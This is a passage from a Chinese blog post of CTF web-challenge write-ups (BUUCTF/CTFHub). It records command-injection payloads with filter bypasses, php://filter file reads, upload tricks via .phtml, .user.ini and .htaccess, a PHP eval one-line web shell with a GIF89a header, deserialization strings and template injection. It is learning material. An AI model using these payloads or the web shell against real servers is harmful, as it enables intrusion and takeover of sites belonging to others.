src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144522877.png" alt="image-20210404144522877"></p><p>进入后猜测用户名为admin </p><p>密码为123456进行抓包</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144619135.png" alt="image-20210404144619135"></p><p>发现存在一行<strong>Authorization: Basic YWRtaW46MTIzNDU2</strong></p><p>猜测YWRtaW46MTIzNDU2为base64加密；进行解码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144840955.png" alt="image-20210404144840955"></p><p>尝试通过bp用附件中的密码进行爆破，</p><p>为密码添加前缀为admin：且要进行base64加密的规则</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404144928995.png" alt="image-20210404144928995"></p><p>爆破后发现存在一个长度不同与其他包的</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404145023203.png" alt="image-20210404145023203"></p><p>进行发包查看其响应可发现flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210404145146471.png" alt="image-20210404145146471"></p><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>进入后发现有四个目录，</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225319518.png" alt="image-20210405225319518"></p><p>依次寻找可找到flag.txt文件</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225337342.png" alt="image-20210405225337342"></p><p><code>./</code> 表示当前目录<br><code>../</code> 表示父级目录<br><code>/</code> 表示根目录</p><p><strong>目录遍历常见的是使用../来遍历目录</strong></p><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><p>进入后为这种页面</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405225956914.png" alt="image-20210405225956914"></p><p>仔细查找后可发现flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405230031564.png" alt="image-20210405230031564"></p><h2 id="备份文件下载-网站源码"><a href="#备份文件下载-网站源码" class="headerlink" title="备份文件下载-网站源码"></a>备份文件下载-网站源码</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405232649997.png" alt="image-20210405232649997"></p><p>1.依次试试发现存在<a href="http://www.zip,下载压缩包后发现存在三个文件/">www.zip,下载压缩包后发现存在三个文件</a></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233727394.png" alt="image-20210405233727394"></p><p>查看flag的文件后发现其中不存在flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233814619.png" alt="image-20210405233814619"></p><p>尝试在网页中访问得到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210405233847576.png" alt="image-20210405233847576"></p><p>2.御剑扫描</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210406114539217.png" alt="image-20210406114539217"></p><p>3.利用dirsearch工具扫描</p><p>python dirsearch.py -u <a href="http://challenge-c5753b902359b43f.sandbox.ctfhub.com:10080/">http://challenge-c5753b902359b43f.sandbox.ctfhub.com:10080/</a> -e*</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210406122908681.png" alt="image-20210406122908681"></p><h2 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h2><p>进入页面后</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412145718899.png" alt="image-20210412145718899"></p><p>于是查看/index.php.bak</p><p>得到文件</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412145809693.png" alt="image-20210412145809693"></p><h2 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412200444012.png" alt="image-20210412200444012"></p><p>所以查看.index.php.swp可得到文件</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412150945950.png" alt="image-20210412150945950"></p><p>之后在Linux系统中用命令</p><p>vim -r index.php.swp打开</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210412195651269.png" alt="image-20210412195651269"></p><h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h2><p>根据题目查看后缀.DS_Store</p><p>得到一个文件</p><p>用记事本就可以查看看到</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416154742543.png" alt="image-20210416154742543"></p><p>可得到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416154816094.png" alt="image-20210416154816094"></p><h2 id="git泄露-log"><a href="#git泄露-log" class="headerlink" title="git泄露 log"></a>git泄露 log</h2><p>题目中为git泄露可直接在后缀后加/.git</p><p>也可用dirsearch扫</p><p>用githack进行查看（百度里有几个githack没有办法用，弄了一下午）</p><p>githack要用python2 </p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233409173.png" alt="image-20210416233409173"></p><p>得到一个文件夹进入后用git bash打开</p><p>利用git log可以查看历史提交记录</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233900025.png"></p><p>看到有init ，add flag，remove flag三次提交记录</p><p>猜测flag在add flag中，用git diff命令对比与add flag的差别，可得到flag；</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210416233631773.png" alt="image-20210416233631773"></p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>查看源码后不存在提示，尝试ping 127.0.0.1</p><p>ping通后再尝试ping 127.0.0.1|ls 看到index.php</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417000733167.png" alt="image-20210417000733167"></p><p>多次用../查看上级目录 看见有flag文件</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417000956928.png" alt="image-20210417000956928"></p><p>尝试查看127.0.0.1|cat ../../../flag</p><p>得到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417120814848.png" alt="image-20210417120814848"></p><p>也可以用cat /flag</p><p>题目利用了命令执行</p><p>管道符</p><pre class="language-python" data-language="python"><code class="language-python">1、|（就是按位或），直接执行|后面的语句2、||（就是逻辑或），如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句3、&amp;（就是按位与），&amp;前面和后面命令都要执行，无论前面真假4、&amp;&amp;（就是逻辑与），如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令5、Linux中  ; 前后都执行，无论前面真假，同&amp;，</code></pre><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>题目是include猜测是文件包含；</p><p>点击tips后跳转到了file=flag.php</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122756590.png" alt="image-20210417122756590"></p><p>用php://input时提示</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122817720.png" alt="image-20210417122817720"></p><p>然后尝试用php://filter</p><p>构造payload</p><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417122714033.png" alt="image-20210417122714033"></p><p>最后用base64解码就能得到flag</p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>文件可上传<br>知道文件上传的路径<br>上传文件可以被访问<br>上传文件可以被执行</p><p>进去看到这个界面感觉是一句话木马，然后用菜刀连接</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210105533.png" alt="image-20210417210105533"></p><p>试一下</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210447264.png" alt="image-20210417210447264"></p><p>连接成功</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210315253.png" alt="image-20210417210315253"></p><p>然后在根目录下发现flag的文件，进入后找到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210417210429525.png" alt="image-20210417210429525"></p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>进去后看到是个广告页，直接查看源码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418123059855.png" alt="image-20210418123059855"></p><p>发现有个Secret.php，进入之后</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418123139740.png" alt="image-20210418123139740"></p><p>用bp抓包然后先加个Referer: <a href="https://www.sycsecret.com/">https://www.Sycsecret.com</a></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418124012851.png" alt="image-20210418124012851"></p><p>看到要用Syclover 浏览器</p><p>所以把User-Agent里的内容改成User-Agent: Syclover</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418124154554.png" alt="image-20210418124154554"></p><p>提示要本地访问</p><p>所以加个X-Forwarded-For:127.0.0.1（我下了个fakeip的插件）</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418125120122.png" alt="image-20210418125120122"></p><h4 id="http请求报头"><a href="#http请求报头" class="headerlink" title="http请求报头"></a><strong>http请求报头</strong></h4><p>请求报头通知服务器关于客户端求求的信息，典型的请求头有：</p><p><strong>X-Forwarded-For 是一个 HTTP 扩展头部。用来表示 HTTP 请求端真实 IP。</strong></p><p><strong>Referer：表示这是请求是从哪个URL进来的</strong></p><p>Host：请求的主机名，允许多个域名同处一个IP地址，即虚拟主机</p><p><strong>User-Agent：发送请求的浏览器类型、操作系统等信息</strong></p><p>Accept：客户端可识别的内容类型列表，用于指定客户端接收那些类型的信息</p><p>Accept-Encoding：客户端可识别的数据编码</p><p>Accept-Language：表示浏览器所支持的语言类型</p><p>Connection：允许客户端和服务器指定与请求/响应连接有关的选项，例如这是为Keep-Alive则表示保持连接。</p><p>Transfer-Encoding：告知接收端为了保证报文的可靠传输，对报文采用了什么编码方式。</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>进入后先根据题目试一下?ip=127.0.0.1</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145218124.png" alt="image-20210418145218124"></p><p>再用ls查看发现存在flag.php和index.php两个文件</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145306532.png" alt="image-20210418145306532"></p><p>尝试直接查看flag.php发现空格被过滤</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145349850.png" alt="image-20210418145349850"></p><p>绕过空格方式</p><pre class="language-none"><code class="language-none">$&#123;IFS&#125;替换$IFS$1替换$&#123;IFS替换%20替换&lt;和&lt;&gt;重定向符替换%09替换</code></pre><p>$IFS是bash中的内部域分隔符，可以代替空格至于后面的$9数字是可以随意的</p><p>发现利用$IFS$1可以绕过，但flag也被过滤了</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145543298.png" alt="image-20210418145543298"></p><p>于是先查看index.php</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418145608672.png" alt="image-20210418145608672"></p><p>百度之后找到一种利用内联的payload</p><p>?ip=127.0.0.1;cat$IFS$1 <code>ls</code></p><p>将反引号内命令的输出作为输入执行</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210418150550054.png" alt="image-20210418150550054"></p><p><a href="https://blog.csdn.net/qq_46184013/article/details/107061110">GXYCTF2019]Ping Ping Ping 做题总结_孙得劲的博客-CSDN博客</a></p><p>[<a href="https://blog.csdn.net/qq_42812036/article/details/104297163">GXYCTF2019]Ping Ping Ping {命令执行总结}_昂首下楼梯的博客-CSDN博客</a></p><p>一些其他的绕过方式</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>进入后是个计算器，查看源码后发现</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424173536708.png" alt="image-20210424173536708"></p><p>查看calc.php看到php代码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424173603735.png" alt="image-20210424173603735"></p><p>看到过滤掉了很多字符</p><p>尝试传入参数发现仅能传入数字</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424174247126.png" alt="image-20210424174247126"></p><p>百度后得知这里设置了waf</p><p>可以利用php在解析字符串时会删除空白符并将某些字符转换为下划线的特性绕过</p><p>所以尝试在num前加空格</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424174652548.png" alt="image-20210424174652548"></p><p>绕过成功</p><p>接下来尝试构造命令得到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424175021538.png" alt="image-20210424175021538"></p><p>利用scandir函数可读取目录</p><p>由于/被过滤</p><p>所以利用chr函数绕过</p><p>构造</p><p>[node3.buuoj.cn:26183/calc.php? num=print_r(scandir(chr(47)))](<a href="http://node3.buuoj.cn:26183/calc.php">http://node3.buuoj.cn:26183/calc.php</a>? num=print_r(scandir(chr(47))</p><p>得到</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424175958985.png" alt="image-20210424175958985"></p><p>看到有个f1agg</p><p>利用readfile或者file_get_contents查看这个文件</p><p>? num=print_r(file_get_contents(chr(47).f1agg))</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424180753601.png" alt="image-20210424180753601"></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>先做个一句话木马，上传后显示</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424222521044.png" alt="image-20210424222521044"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184048567.png" alt="image-20210424184048567"></p><p>用bp抓包然后修改Content-Type为image/jpeg</p><p>  Content-Type（内容类型），一般是指网页中存在的 Content-Type，用于定义网络文件的类型和网页的编码，决定浏览器将以什么形式、什么编码读取这个文件，</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191606823.png" alt="image-20210424191606823"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184352223.png" alt="image-20210424184352223"></p><p>放包后又显示不能为php</p><p>百度得知绕过后缀的有文件格式有php,</p><p>,php4,php5,phtml.pht</p><p>试一试</p><p>发现可用phtml绕过</p><p>但又提示</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424184937815.png" alt="image-20210424184937815"></p><p>把文件内容改为</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191120947.png" alt="image-20210424191120947"></p><p>又提示</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424191418367.png" alt="image-20210424191418367"></p><p>在一句话木马前加个文件头GIF89a(GIF89a图片头文件欺骗)</p><p>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.phtml&quot;<br>Content-Type: image/jpeg</p><p>GIF89a<script language="php"> @eval($_POST["a"]);</script></p><p>上传成功</p><p>猜测上传地址为/upload/</p><p>菜刀连接</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424190843452.png" alt="image-20210424190843452"></p><p>在根目录下找到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424190943560.png" alt="image-20210424190943560"></p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>文件上传，先传个一句话木马试试</p><p>弹出js，</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215707910.png" alt="image-20210424215707910"></p><p>看一下源码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215933835.png" alt="image-20210424215933835"></p><p>把这个事件remove掉</p><p>上传后又提示</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424215102729.png" alt="image-20210424215102729"></p><p>试试改改后缀名，发现phtml可以成功上传</p><p>菜刀连接</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424221314425.png" alt="image-20210424221314425"></p><p>在虚拟终端中利用cat命令找到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424221437332.png" alt="image-20210424221437332"></p><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>根据题目得知有.bak的备份文件，访问一下index.php.bak得到备份文件</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424230600364.png" alt="image-20210424230600364"></p><p>代码审计可知要传入key的值与str的值相等，且key只能为数字类型</p><p>因为==是弱类型比较，根据php的性质可传入?key=123</p><p>得到flag</p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>到payflag的页面发现有两个条件</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424234920389.png" alt="image-20210424234920389"></p><p>查看源码</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235003731.png" alt="image-20210424235003731"></p><p>抓个包</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235104576.png" alt="image-20210424235104576"></p><p>将user改为1可满足第一个条件</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235148397.png" alt="image-20210424235148397"></p><p>之后要以post方式传入一个值令其等于404且不能为纯数字</p><p>所以post password=404a</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235248917.png" alt="image-20210424235248917"></p><p>提示要pay for the flag</p><p>猜测要post进money=100000000</p><p>传入后提示数字过长</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235409212.png" alt="image-20210424235409212"></p><p>采用科学计数法，得到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210424235455547.png" alt="image-20210424235455547"></p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>进入后看起来像是上传一句话木马的题</p><p>先传一个正常的</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501165659496.png" alt="image-20210501165659496"></p><p>提示illegal suffix!非法后缀</p><p>改个后缀名试试</p><p>改成.jpg文件后成功绕过，但又提示&lt;? in contents!</p><p>猜测&lt;?被过滤了</p><p>修改后</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501165911275.png" alt="image-20210501165911275"></p><p>最后再加个GIF89a文件头，绕过最后一个exif_imagetype函数的检测</p><p>虽然成功上传了但菜刀无法连接</p><p>百度一下wp</p><p><strong>.user.ini</strong></p><p>　1、auto_prepend_file 在页面顶部加载文件<br>　2、auto_append_file 在页面底部加载文件</p><p>某网站限制不允许上传.php文件，可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。在含有.user.ini的文件夹下要有正常的php文件</p><p>再上传一个.user.ini</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501170533467.png" alt="image-20210501170533467"></p><p>上传后我们访问此目录下的任何一个文件时，都会去包含first.jpg,</p><p>根据其返回的地址用菜刀连接</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501174943263.png" alt="image-20210501174943263"></p><p>找到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501174705927.png" alt="image-20210501174705927"></p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501204543745.png" alt="image-20210501204543745"></p><p>看见file_get_contents(),利用伪协议data://text/plain;base64绕过</p><p>再利用php://filter读取useless内的内容</p><p>解码后</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501183046395.png" alt="image-20210501183046395"></p><p>可知flag在flag.php中</p><p>试图让file=flag.php</p><p>看到unserialize函数，利用php反序列化</p><p>构造payload</p><p>？text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501205224647.png" alt="image-20210501205224647"></p><p>查看源码找到flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501205239104.png" alt="image-20210501205239104"></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>页面中提示有备份文件，御剑扫一遍</p><p>找到存在<a href="http://www.zip/">www.zip</a></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220739803.png" alt="image-20210501220739803"></p><p>重点在class.php和index.php中</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220822144.png" alt="image-20210501220309908"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220857753.png" alt="image-20210501220857753"></p><p>所以要传入一个select参数，利用反序列化让username=admin</p><p>password=100</p><p>因为username和password两个为private类型</p><p>所以有隐藏的空格符</p><p>select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}&quot;</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210501220212731.png" alt="image-20210501220212731"></p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>先传个.htaccess文件，为了解析图片码</p><pre class="language-none"><code class="language-none">htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</code></pre><pre class="language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php &#x2F;&#x2F;该语句作用是让Apache将其他类型文件均以php格式解析</code></pre><p>再传个一句话木马，然后bp抓包</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502142204069.png" alt="image-20210502142204069"></p><p>只有将其改为图片的类型才能成功上传</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502141437234.png" alt="image-20210502141437234"></p><p>根据返回的路径用菜刀连接</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502141422576.png" alt="image-20210502141422576"></p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>进入后代码审计</p><p>先get进两个md5值相等的内容</p><p>md5无法处理数组，会返回NULL，使其相等</p><p>再根据php的特性post进passwd=1234567a绕过if</p><p>获得flag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210502172416595.png" alt="image-20210502172416595"></p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>从提示可以看出来这个tornado是一个python的模板，在web使用的时候给出了四个文件，可以访问，从提示中和url中可以看出，访问需要文件名+文件签名（长度为32位，计算方式为md5(cookie_secret + md5(filename))）;  flag文件名题目已给出 /fllllllllllag</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723131705440.png" alt="image-20210723131705440"></p><p>所以要做的就是要获得到cookie值</p><p>这里是采用模板注入的方式 </p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723132903953.png" alt="image-20210723132903953"></p><p>这里可以猜出来存在模板注入漏洞而且应该存在过滤</p><p>然后百度看一下wp</p><pre class="language-none"><code class="language-none">在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，具体定义可以[参考Tornado官方文档](http:&#x2F;&#x2F;tornado.readthedocs.org&#x2F;en&#x2F;latest&#x2F;guide&#x2F;templates.html#template-syntax)！</code></pre><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135655762.png" alt="image-20210723135655762"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723134312675.png" alt="image-20210723134312675"></p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135914756.png" alt="image-20210723135914756"></p><p>所以可以利用这个来读取cookie_secret</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723140608282.png" alt="image-20210723140608282"></p><p>然后对其进行md5加密就能得到flag了</p><p><img src="/2021/06/17/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135951327.png" alt="image-20210723135951327"></p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" 